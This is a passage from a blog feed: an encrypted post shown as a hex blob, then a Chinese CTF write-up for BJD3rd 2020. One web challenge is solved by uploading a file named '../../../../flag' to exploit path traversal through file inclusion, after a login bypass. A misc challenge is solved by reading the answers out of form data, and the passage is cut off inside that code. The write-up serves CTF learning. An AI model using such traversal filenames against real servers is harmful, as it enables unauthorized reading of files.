27211f62e69b3644a8eb476042b645196b5c8532004db447f577c90f396a287924e43be3066a26e7900ce5b9876c6e730274ab396146491f518a5901168c18b9de0ec508736d97ad905c7a234c5b0b7b4b110164aa2ad87f4333e7002f77dec4936145218d5213863eae1363ce9eb7e8673de63bbeffcd2039011c2ab757b280b15fc7bf47a67979d66dc7f913cba22f4b4b29127b742f62735fc439fc2cc2383333411dbeb5b6ab9917d8b83d28e43a01c3c51fb747408a309f9ed265522b26ef164142b18623817e77e32cf310057ef05623eb134d90040ec28b61527c77a842ae459caab7c1e7a3d1e8ac3af00219b5411a3a48718d9b17615903e91001ff9daa8e1a2daea8c2f93d1d3807ccaf9814ce73cdbd47bfde27211343ac1702d045ca34cb73bf0877e5cd2d240bc7d12197f8c9a13fa8c2751c3d10db89571654e93f6be592cbad64ccedd0428c947486a967fcc79dde3ae0a3160fad894afbbb030990305c7fab2ce94d8ea1724521a51802ce74c86a4d81b3b8819de7d0d1480427d6207e637a50f9b056658a981f10f713092d4ce62cb241e60b997ee8e501423d1dfe881f7d8889167e7e13a5074ca8c913180a2d5996921b24d43ed2035ce280048fe30e871b83705b186a7dc4e79334313aa082d7132aa23fd71d8ce40722c42910dc5b98ed95000180dc4845889e04ac1ffa28d4404d07af15c37c3e21ed7d94315483d39bedb5e27a4090ac66db4b859530db44386370785507c1934f816c5be5d3c74b31672c1e70e72affe26351bd0b23c9d63de4a33f1923cb4b60d9c6beabb196d0386e05a9fd33203a8f5917be3e551474d83e036214bdf6f97ab70680377dba0a86f4f4f28657407e782a280d41fde467991c6bff6b397b1577b186c1e0caf9516f0ef91caca2ad96645574a8b3c3cb8e8cd403fa113c24d302e95cc4c084d02115fe01f4d12b03d3119c65f42a1035df4d34425d9fa609fb9894c065bf6522aece0c077f8348d36f5b87554a7a767e363eb9c62944a1cdcab23ea351e5ae41ffaecdc1b904db3e5c4a8c2badc406d8ddec1d2a8f176328535cde13f7899fe058b3e75f767445c1d77174a20d1b029446626ea19ef4e576030b3d77f5a2b21077456f53e7b3ae71aaa1a386115c82672f769ea7630abafae20625851f54399ce1f8aa052a059b4d9d0356476bd68b41c68b53a8fc5eaee6ec4142a36c0fd3046c11fa16c6f74ae31f2d23b1b2508f7484264407dcf2f8fbc60a311cafa3369395d1f1285d8313eea60267ef7264dce84410b3d590f6ce4a3f0b2ff09f8618c97b9684198016120c8080b8398c31ed83947f77b4e74d96e57aaedf7f7dd9a3703377097d426ad773041bf9046fb09760a613c9bf02a61a7ac796d92fc2d5c09481ff78478e5a71ce8b2b30fc801f603586a2d994485c20256878cdb6b05be4445f8eebde93c84d2c986c85b243c6862feb133d2f0600bd09a66dca7fbc5004fac15b774a27f69ae734e7a5e0264e817efd6383ac410553e36c9cd09484982f8777342fb62f146e02479dd0f0e6ee37de4c653b68e70f88f9a111f8da02cd59b0aba0dae05d5a61fbdee82e769502fab34602fe59c090a6792e326702bcbcfa0eaab7686824ef78bb468c9154c2a7de1a87a1495c30fe2da7a14d7381ec5c79274ec149483bdb29e970d18219d5469652d9b167b7db62ebd223e3089ab9d7f1057726a966eca052e6fbb674e97c79c624100d0ee81d077bb0e372718a68a637a92df95dfe6316e46aadb6d4f99f90df6c7eaf770a23ca8d9b071cd01d4496ba975ab5f4a08e575df1877fe16e943fe4b6596dd8d18c8af079800c457a9ec79c5ffca963cb22c111666fb0cc7fbf39ef06f3a5b11809c511643d69772986f7bc969bd96710cc69b8cc49f3f2a0002d2a1cc6617c5bee8ba3d793cadda1e20e62142a486bc6682d4bedaa955e56d3dcac892f600b89c139bb0633dba285a9e3e9493d6cf59c4832d3fd5261b93ef7d32ae879fe1d568a2eab5ea6febe53b8c7cfad22a16c815b94cafc49cc42aa842130d4006c62d168eb4f28203cfdb660a615526d8c55a0c51f3dde81ee2eb93dc982c52235e65a9aff4558f15971901bca7fd856cd89028189859eda673615dca1b65ded81046dfb5d224cf1b08fcda816c49e4baad1181481ea1c86ec6f46cbd77dfd2c8561542869cff6c6530e6b308c5fb2ffde525e6c990ab3a478df48a81016376d8ce05612b83e5325726568a99e1d0f1e2e2f874192223d9c4c150edc80600a5d84db05bc1807cefecd677fb8eb1ef746781b52a4942a3185020d8ba54265c093dd6aaba86036e2bd21820288cf64b364f61edad7c685e2d0cd15dc4fe09add78f9c262eee25ffa5414e8e1fd74408bd2b09685cf8a01ad0f332322ec25330612c3163602c64c3d5f53fc657a1ca219d9d58e873fddc40b69b36b989c44ec7784809378598444b42ba107de971ff85bc6ae792db96eae6dda0018d275f4b4ac9845df9f9b829d1fe49b39d16413d862935a7cb0d8e4fbaad6d2c8728bb30a76fe1e93042b77453e66e5ca5adc3571c4a7954d75351aa667c8ff4f5fc57677ae191e095838274ed22597c7d92aa51cc65febdf58c04009acb4417871a62a9f5ea4f76dab09a63721ded04a1caa241dd5a0b8c572b0c20eb1bb4b2ed57db4e506b67b4881212e159f5ef7fa8dab92b459990afdb5532493b78d1d28d5c734f958fa7f3039a6dd362dfabaf69ecdd2cd72e816bf1e2a40abe0ca3bd61a9568988f0abd0e79f048ec81fc4b61309b6208918ae5f8ca2475480d45d35f2fa4a2fce7fe54c67ba0772176ed3c15deecd9f8952514c7bd0d091155130e9d582283e473be764215297f6658dfac94f03c6537b94626d67625ef93d6ecdc336fee16b27105b287bb4ecac425ed06db9e9ecd1e3ae6b4340e984fbaf768527fc17600d4a29914b995a4bf5d33c540f944d9ece92178f57d91553120703a4353a9f5646eb778b60545cc8a099076c5ac8a3488fee5dbb0a9681348057bb03557781368ea536fee5fe7aa5014643f4e90de2a020caba6891a29a1c95b634cb7f6630e2437c799a9885b6016ca154c4d8ab444b638036350cca97f23a88cf7583f1e9bd7d5e77fa46a8a59701d8f219c7e9c6c19f87e14008fc0a2b0d391c0ee26567a87f3598c769c35b494330e9542b8a148414068735b2b6c5b2f1e2c09899661fb07a1085903cd04a665949f49200a7b48df4fcde24ee8748acdb813d96f4ac7fca5b3704ab32c39d49a3c22f866172b668427cf3f1ffa4b3059ce3dcb44ffe5dcd247a265ee82916a54b17a3c6efea136476c1d880fc385da475df90339965e89d5f53c03af50d895bdd02202391907a767eeb16b5e6553efbf8cbc7f4d3acd701557ce2699def4816ac309bb088b4f384170c7f4d6d585bd75f7c82d484e27130222e0e5a1386bbc34aff84e00e41d59542ce6092cd2443d60bac880fcbca831b07d38c0b438b04eff606b46c8b5bf31a31bb31160f25c64d66224a3c1b8fc787962a88fa9667df72e849e580a90338178f7a907763dd513dc6b141378207f7676404cf263922fc9033c70e0a3f9e20a8625d4a884c0bfb90bf911f097c04fbb102b2b73c0dc0ccadfa89c25facdbfd3bc89cac5c9de646195f3b60fe7c83444a43c93402dbab5155b5ccbe6d45c02b9c647ec3d8a54915bd7870171bfc5806813eb9cd2190a1e71958d0d8d938cd1bd4c9bc03e17890637ad3c0843e4b3ff4a8ea28aba8ec3036bf79f9f2908d181bcb87e4183df608b0f40f11b0e46ca6921bc772491913297685942ea7fec3a9e6e82eb2e575724b81905ca931c066ad03a90eb1ed10e303014b019c27047eeebe6096e74f300a680f125cd34b82f90d931b32d31ebf9ce1d2d78a98fba8b2249760744cfd35de1406e57cbba5eca66b386481d22163fd09271f23238f07f8836933384b108cbe1f2895e0f0efafbfca88e582ca4c6e2fa2ee7ee5acd5f559fcb1c4f887c88a6b2bfc5c57ecdbfdd01646d704ba4c7091c2e77d054de4c2abe9e93048ea2305137bfc8c47d52c759513125ce7e225d94241c1c1bc077c8285c1275f925ad8b379973bc246dec8255b5f1bd39d492e3bc4e8763dde4c37df746566bf8e14ca87c741c50add091878c68a24c9b0bd682e75905bc82f4b7cac743969f3050a90615a88ce14bdcb70c5f34d1932c4fc4096df649e9d25cb05530fdd1fb4b8c1dd9dfac0293e095c8407e57c008e85cfd755945bc283cd9712b846c42e837899f60577576c207a16f61a22879c783696ace212c391a4d45a405da8f3393c7f86f49687cd58c3e5d5432e374e3002bc90aa38e01901b7a751b382b1d5413ac26d4f21be3d4afdf252ba2895fe293506e7ec926f9b74f7b58f21738b0fe3e716b06ee6fd6c92c0847131014fe194ea96a4cb1cd3beff18a03bdca88d758c6750bf16274ebc4dc95098fef8de21e546034e2af9c033e07802c07cecb637f358864aa72eea22b3248497d61dadd8a06f639703cc79e67c8d23b2e167279c00b1fd6c559e9afd56cfac5cc08b76f06d0871381d43b77955de88a94fbcaf9fbf634f3b0dd262a974e577e9a45bbb391d36063623b210b64f16712e57470ea38e31bf7db05e946c3d094ce0210c5f91b59f9e3bcff4165e58b17754c69e51840a4d53ffb5f28b5155faf80732562701c93e1f2678940ed84d0cf59924cb05291933708a4fcc8345c964757a641e342312340d430ebff7c0ac60d511b64cc96ed0010df64affa7007c940398efb14865fcaa3fabee6bd578d55c6bda5ce70d7edae3035c6462d554b51e20b19b8f2e8e892fb633dd27d8b9ddcea6e21dc512e4ce448a545d01300f6e633f6b8e52141392009f5b372bf281070f7c5c9a923961b73addfdca703cad7fd58dbb468f9c66efb695eefe35fd6737518aa45b47abf7543f668afe63d33954b43552c8dee1d8a062782eba511ba02fe6bf4696e4e5c73b262ebe57ec23a26d2ce35725d9c5e6409e6ac7b6379d08d85aa3ba444aae88302987248eb13381ae9b2898cabde006e8b515990ac9a26eee41f23abf40e792cc89125ae6b1d82601a13a060c836eb9c04eff3b4568a88090742cf9c05474b88fc7544e57af8d57aed0bd19c77ec0d284b1eafc43fe055fdaea4059da690c27b8f311e6faebf8333a3a4b8d002d2dec0abd4f1df2d3d79101293965ed68c8b03388520c4576e36578d5c80e03e73bb87c15eb17ac5e875dabdf052f9f8cff7a8d5cbc04aa2c80536baa9c270c23e7b34c5e20164a52396719557e464c0dcf9f7bfb7b80ef9686bed228eee391c22f66595da4b55f0149f1da26527795add7818dba9ca256b5e58d851663d16466964584a4baeef666284a869daeb061a32ce667a7e698109412faee5d7d5153bf1c188b55e9b37389febbbf4016623fd8f103202113314be8f01bfeefa07180c512f7a1dd952fc0f8d78ecaa0b11379a1010498f90ad1457bccf60d93d195359a8b17f247763bd697e216791acf945646c6266215be884e779cef119f00a2af5ece121b7ca93e214e49d8c10faf201c703b481fc2b7044d642a2b000f409fbb14412a8be8339de882edc17250ac24c47ff5048d824f3f77a7d3e1442c9fdd5bdcc201c7c37ec52cad95e05816af77f18a9bfe5d95e932128aacfbf693d7fbde82bb60f8c2300a14f76739bc5f6cb92f4c8e9fa1480dd0c2b47254c8eea792de8ac386945b0feee645f61e7fa793b131406c40012bd07238fdc8eebec750e223dbf2bb8d9c2e5e3150dd0493eed3f1e439f1372e4f3358ad6897f3c5cacddafa1096eb1e0ca251c65746f41fcc2a039a210ee3e8b1cff5efcc0a01069614e6149b4331b59b4cd440c1107f9719e81f63bbbb6db773277bd945c5fd81e326828769c8ee8a4bd664d02a7f76da3f65ff8b75807a907c6f4a22ef2e5b8d05bc91c3b839f4cf40695ae5dfc5a53cedafa7df379f3fc5073b71456f33863aedff781d043a9ec362a22def8974cbe45291ac6402a407b1626dea8caa99a7529e0e9c916c68a0f9db5a0e6b9534319dbeb26bbb5f93a38e5c0295a44e2f625787a38e5535da9a4e28a71f617ec482ce6c8e26524e0b92ddf288e2ddbfd7cbca1dce88fdb7cdaf95019f509cd2f3b71f7c41e7239305ee1df988074a7c2853756e2eff533f823ca68598be85b3cfae9d2ba60ef119faaa34ef8b0e5977e5549f4fa327d87776e56829487c1a8076309f0a31e0fa676f2f56458bcfff6cd114686ac814b7fcfb38bf22b8635836c8524392393b56125c87223513cdae3cd5881491ea9e827ffa134a8656d1258ff4697f1cc9331f48a35c0f8ba6d29a60af68db8201ba5504664425f7530a40ba57e358fb3e06d6ecd2f3cb8730e924d9c0a08297cf77f3e787fb8e387b27cb670781019bc1365e99879c485b05c355fd9687e1a51ef8f6887bda53684b1f2296eec4a59b987f780b6acc1c33a9b624ca47bb7216eae15fcf24a625b79f14a25d7843f14d293159e20164e60e05f8188b39180ce6476c00ffcdb8be746a6ec1f2db7998866cb860d0ff30b06b9aeb038fa44492d5cf944d66233eb4cb05da9beed240613b8e2b5f4991f17155000e920901dcb7bf37e0e2c91dc87eb1e441281b75e48020d493dfac794880f26adac2f20f58c9d76f4fd2223d28d88b1614182f8cb1da9daa25f77805cc59a005f9212cc1844523c2d34c1a34a874121ec99bbc1287b923deb01b8a0c73ff2ec5deeaa350dc4d258cacfe599387d75bace0e55216e52c593f1cb67e3e84bdd0b9b6aa5a3f7c51e65d6cad225f9380d40a11c04b0785f50b4c8bd5c33892618c1e7d8b7e3077f3cd5c58a63d4e4a508ae6f4382cd8c84ce0e7e0d2ebb189bc9a82119b53710aa855abdb51dc10489153c97ce9908fa6f335426988388d43bd475c0b8d191e4883c1c4b5f6891b6ef2ea109b825e56aa7a9facb3ee434d42bf0ec33906220b3a52ae4bcd5b7d344644869120a5d60be37bb77463e8719c5c3ae7cf45162993142b6d5625eb9dfd96e6790a234264181f73eee14ff44e244f87818e77428646e9d35ff59f2716dba31a8c43815a811da12a42f72c45406300425619899ca6eef0eea8b25b472d0eb62eee0c7ddec772f4e6d540d41c132fd00e0705c14740ae2fb15cd94e531c509e9432626052708037f33f3b71d97dbf1b36d58373c173087aa021f614def8844b8ffcac77288a5e3c210c8cd4ffa33a16ed7b9c2467708f3fd4c022a9dfb044fc43920b01280bac04da5f717d3f61bbcecbb962515d27cc1e33151387ae4bbb72cad4ac2ba175b945593fcb15beb0f8954937d73c42d12ba90d04c1c6bd0a340a010759c554d5fa26edc89b38142ff58b7811b8ac6f0c2aeb8c9878e8d9f435b935e76dd361dc76414c78d592dee5577080b28feefa28eadf68c550fb72b5ed14fe7b7289546c742f27fda82904d52c7a97cb620a89fa5c9160fdafc41217b2bdf4023e60059479d7f09f55edba163d1e677d67f2cd582f4ea779b691ccd60381586d4e755fe0c2c7cedd6e23c65b470c77193c5cccac685aed536d99381158dfa7cec51e7dd3343fa9105f7f839044d4a2a13aa58a6cbe1c1b453010f21037bf824fb61f7291ec85efc94c0ab51ba33d31abd62a8d213e45a27f56d6f82b6255843592456cb492d98a5c258df357f0c33b5315e84c303d740d1053afcf35339a8e91e28a0a1300bd2cf8f1445b0a9e1d7671c7e093c5b9dbf87c3bc9034feb6d211c942d5e33dcfa478d42645ad4f738e7f80b5731733b8545ce11933d76727fc66bd6310bcdb0521b882621c064ef7da5d2b50da7fbfc7a4e14fedf39a62104b4ff10c91d917efe7bea2ea6b3c8508fd5de36d6257edd428456a9e44a52bc7f4a7dd22a50445da0d088cd2e3d5af46f3df66812089e5d2a3a3bbaa8cc489d5cf471d0f44a39be201919fc9d2a7e7cc7f44ccfc9e335caee8f6efc2ffa9b512d91d2c721053f5c6cf6255b80fc780f7ad3509d79205e6e3ab143548729d12093fcb6d11db84dc10f6b4829c295a43e22905f30c3296cb20ad322f823a2e7740bc542ed000aea83222307c1841d90fc8a942f40aa343eb9bd1553f589c2fcf11a343cf57f6ca046bdcf235ca2511586476d10a8ae106b6fd816f7efb75bdb26cd49fea332d37bb4947ad0b7e0b6a0bc25e5bac9cfcef805753cb7b55435dbba0bdacd7c0e4b9ca3aab22c79312f6f51c8f79b5bf181aa68051fb51a7cc6c8c572d4610f0325d36d94b47f2d695150982dbd48feca174e1fd4682bb2b758f8648cd878934d814fe0ed5b6ff2723d2db2c88e0003726b4cfc7bf90f5d1dc4650972b2a7b98e86054bfce553b2d2a700dcc853c9e17722de0f66a70009bfb87fd5a0188489713bc75ca269f67b42e7d65d25d515dc19a52ba230d19984ca26e2b6d7c329c66b44693a97310c623e82b0c198487b94e80a9a42174145f4fdc75e435b445ddf4f38ec9fa3e32a1d9e83ab6e09fe6c539b77038c5cd4b3e85531a9d317815c96ff6674b316d6f70fc40c5e9f3ab3e632a9d0f913f85f3f051d328a9c81b2df5b2cc46e4b04160037001c3bd13f6146dcc2dd28c126301a53d6c5b6633319fe3895b54eb9d039693db7ecd0842e6671c428d66825caf16429c672f48da859bd9694f726fbf03510207a5b02cb64e18beecc3bcd357173bf2b85a034ccb8eabe7c4bbf2ca1172906f6c00d0cc401d71e2edb31ef8703527ac83e558521824507d7606d1318002907313e1375d1e9ab4eba4e6bdb9a0b484b93d837a1a7317390e7d9316805adce1b1ce7d1932ad93a49085bf41ee7e72332ea0d3a3b7e8633824213ba82d73ade56be042a87439609b6457a1711f9ed2cd0d2925f4956521a63a4cf45117f04af66dc65c9acfc6fb9e931160db00ce33ee374b3c4eadc67c188d29b8de0ddd210feea40dec94abd3909210c60a785ae08561840b9d54f60d61a29a095c9b17ef2b390984e4b32e5beba1316b8d3302b4576d7126b562c185291fd90d6591d0b2936b6ba8ae0d19c90377286fddc5f70111d17538d8530e7c8d1713163aa596a1e9204572afad0222e9b896d39ad8d6a9c9f08fed1d41870b2dd90afe4ff15446dd93127919f199b2f3fd9b9b82bffa6e946d928ebba3653ba6f013cf1408979292a9c3493fe06ff97cb41fa554f40aed2bf222972033b77b9499eafb348302ac1eb9496c5861801f7fa8bfa816775089d47772360fc8d5fcbf15f654b20b4f44821a3cfdc649b2fca7cdf59a8faff9aa595ed1bcad51c7b9b2566b05b53ee855c3044394dfbc7326483c70b1cd942cb5f24ea0f1830bc3dd3376a3807808904d009498771cdf26b306500ac93c0a8f55dcf5f11a9a2a28ad6f75cb6e96c950f4dd7a482cffd15f332c46e5c59666ceed21da306cdad965d93bb7e889ed5991283486d238053483f528d5070293ce1e3bfb787f76d53a85008f4ee6df63e3ebd33a3fa3f6026c9dd51c7f8dcc209a970c074eabddb7c5b17d33cf85fbc89fec045e1af78de5ab3a1e43d4bc48d9305b3dfb471dd848919f1c7f61b082b5b06984ec479c1e7f70901547fe458321b3597abc3ff0d2326975b5fd7b56b069b6efb4fdb4c71e50dff983310279866b97a7053febfac39c57bcfa028a24f32bc898685625bdc52bcfaea84c8a8ca4de42f57dd88bf8bcb5f36eb74bc5ccb77dc1403a0d756c8c5c85bded6e2a9baee739778bbb89dcf852140194215234727e7281b46c9b12f16c38c3a4d9abfc09300e6197d0a2bb287f87ece297a6ce45cb49b3e2993be3806e0663f7d150761f58bcff5118e03e879bc0c80ffa5f6560848109e684d9cb035a85a399da1ac50ea243ef0ce599607f7c9012930cab5fbb8c4e49d5e74a0d1216d6fa207b2974534c735d660f4870586d09f00f7f254e3f76c1fad2da5084eec684e240341e667e0dbbac85139714971b9bf72c4b05bbba6b1f60de3c651450477f24d1ebea8d8c0f1ea29dedbdb979ea805b549eb3bb4dabd598e96cd40a3bb12f05a1c0f469f10f6f94fb7a5fdb81eae8bc58d5284ce81f2f63ed94801146afb1e1ee49ecf72cf96517a5f401cd2cc80dddcac80f4e42bdc16fa328789a01818fa28e993479b2c92f37d6b6aa36a2e9124f340a559fd0110d5b7f7452f973222184c5844859622b0f0fc44fc85d41d47435d4c10c6c2f4952fd7010886659c0bee0ba9cfea9c5355680ad4082faef77700b44260c69334353a96e548c64ed82f4f22c23a5238bceb20a583099e22b00179d540cc7f5ca6702f5c57809a802eb6e57c9d16116d2bc4147f96c3bbbca9a92d26e2fca9a89969e9e88991f60f5f4799c9e5a12567b4938ba7bdffb38e0781434d764790ceaace443934b6127a8f605d1c43324494133aa48d675daac00207f25298e4093f26cde95bea22425473c308ca9eeb0cf2b0edfa13d1e1f9288c42755dc4977b76718d79878093f07f8e31039bff0595b8b59bef81562c5326667d8849668d01f32a2c5f8d20b826cf59b29348a6e67c501676ca6f5f6119f4014da8238d690d831bc356975ad6a1a5331e7477a18a827d52681fed26d93d76a522bbfd402d78a79a9c126c66ea28cbc90290cca2f72d6fd4b9821a0b93f6d7c2fe6ebef4995d01cba2f818b930d6533552e5ef15a24492f1060130b40704b41eaa231121ffd50a5872611646f7fb9d6beebf9e37d413c05d26042c23897b7545fc491c4c07b9301caf47446c8353bd6e4803a307532b60cbdd2bce9977347e2141c3f22667e9ce0c1560fee4d6ed7e265afc96b390d41f5464d01a27a0aff49bb18bd95aef1e0cb0a727c8d3a1a5d8f254121302572b58dfec07a42db906858ed9154296310858e0190642428eb45ed942177e0ff6a1aef825a3454bbb82ea8cc172404c5ee6cfd629b3237a21858108c55005e9908abcc46ae63107d6ece9ef858fbc54448577e4c06cb44ca0d001339a7d418aa8140d0a047af20415b79a2a2d3400f249ad49d2b4e0e0aeda618c0f3fe8f4e80c0729ec1eba746ff2d30ae83cdfabe27b8b81c926b0bcedeeaa852f063c3a14ad25d29fdde318af6edd954747db76661182a1bb4d6b5743536740588e540795ac59158deea892031875fa2b7551c8d474251136ced7ee85806be04457c8660f4902b6dffc3c60d6c9edb650281c693964f92b4759457eaecbf55874970f1d4b71f57e35d9c62587d3258b3402a795a3d2b4d86979333e7561f4b91dc58fb5a6d70ec37f87a9d8dfdb6bd83eefbdc125a03ac18c01b7b413dcced54bcde11ad4df807719721189e1072895e1eed39d5e66242480ea90b972b43c9d9613c6389fe2316eedf3deee45f04a80ced11407b8599309d054d52d36a2b10a5c1ddc570dc1552cdd7db6339d34b613ad019189f6c9d9b5f83ad3d7a57dc436c4eb308b46eab46caea704fdca5ed19f1ae2545019cf278e112bc3388578c7bbbb1f44e34cec8752855e3e2eb5d9345c65f856cce7b1bfc6a74a9cf70f35a73f47a09962197eee3931bcbd67aed6ecf98e6ed3d7838c08ce7ff37f2c225dc3447718810234d2c67a930987fe7bfe604c6dd0cce94b968674780b2837eaeb84b0b22a9585a1035bf636295778a6de2f9c33fcf9c0dfdadc68b09926a5fbbcc701182c9c6a09bf5c2995f85b7985a86e261a0965576d88b3be9a7f7006c2eb414e6c7acfae14befa831c548523c919daf239c1056ce46d78bd996f31223ed876928315a89bf61fd9cb5f1f7b8d082479decacaba13fde0df788ee4e6762245d3cd71bb5c0cafe47fbf48b8bc3a243b9b07827cb3f46fadeb4313309651ee7804e4d076cbf9aed76d08fc27b4ff95e227506ca04e2a9fc54d846f11dd4487c8359793cc3804187f76724ca3b383c1f63f8d8a18369c59cf7c8f985f2eb7dd2c00a4633078d575f79e26529a7344e72ec3ff0e2d7d5f8d659e0a8dd9ec913ca2433af298e312b99e3bff934bdad091f710fe72441c83e989d7934f3f8e37504dd49174e87a4df186e56624438997e02c006bf0266de8cb0971c06997ae772572fbfbd54f08c662671ee93d90a297b6dd01b4331c5e60067501fb73909a87dab784367931bb788724a934839aedf8c4521199345e4565e5406ef14d8febbbe8d6ee5351edf5074856a406c5db7f9b9c60ace1d49900ceea9c6e587884e06ffefcc859fa6f5294cb202b93d4507b11a01c2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 BJD3rd</title>
      <link href="/2020/05/26/2020BJD3rd/"/>
      <url>/2020/05/26/2020BJD3rd/</url>
      
        <content type="html"><![CDATA[<p>文章首发于<a href="https://www.anquanke.com/post/id/206493" target="_blank" rel="noopener">安全客</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h3><p>登录万能密码登（好像可以直接随便输？）然后是一个上传界面<img src="https://i.loli.net/2020/05/23/RfcozNwBxLAv3Gq.png" alt></p><p>上传后易得一个二级目录uploads，然后看了看目录里都是各种马，但是因为不解析所以一个都没用。。。</p><p>但是此时发现文件上传后文件名并没有被更改，所以推测show.php文件包含也是直接包含的我们上传的文件名，所以构造一个<code>../../../../flag</code>文件进行目录穿越，再访问就可以得到flag的base64，解密即为flag（PS:必须得在同一个session中）</p><p><img src="https://i.loli.net/2020/05/23/VG3YlUBnEWo9bJ4.png" alt></p><p><img src="https://i.loli.net/2020/05/23/kmSYPdNV4g6qeHM.png" alt></p><p><img src="https://i.loli.net/2020/05/23/vlax6wsF7CgcAVR.png" alt></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><p>F12获得flag，标准签到题</p><p><img src="https://i.loli.net/2020/05/23/SOJZixI9wepd6Ns.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">416</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">603160739</span>,<span class="string">"What is the name of the store?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">539054317</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Haolinju|haolinju"</span>]</span><br><span class="line">,<span class="string">"8cd9"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">416</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">488094967</span>,<span class="string">" What BRAND is this food?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">1465781074</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Daoxiangcun|daoxiangcun"</span>]</span><br><span class="line">,<span class="string">"8f00b2"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw"</span>,<span class="literal">null</span>,[<span class="number">375</span>,<span class="number">458</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1097246628</span>,<span class="string">"Which RESTAURANT are the ducks coming from? "</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">353762320</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Jingweizhai|jingweizhai"</span>]</span><br><span class="line">,<span class="string">"04e9"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">555</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1916058196</span>,<span class="string">"Which PARK is this?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">901636349</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Jingshan|jingshan"</span>]</span><br><span class="line">,<span class="string">"8009"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">554</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1044111735</span>,<span class="string">"Which DISTRICT is the No.3 of Beijing?"</span>,<span class="string">"The restaurant in question4 is in this Distric"</span>,<span class="number">0</span>,[[<span class="number">1620980704</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Chaoyang|chaoyang"</span>]</span><br><span class="line">,<span class="string">"98ecf8"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span 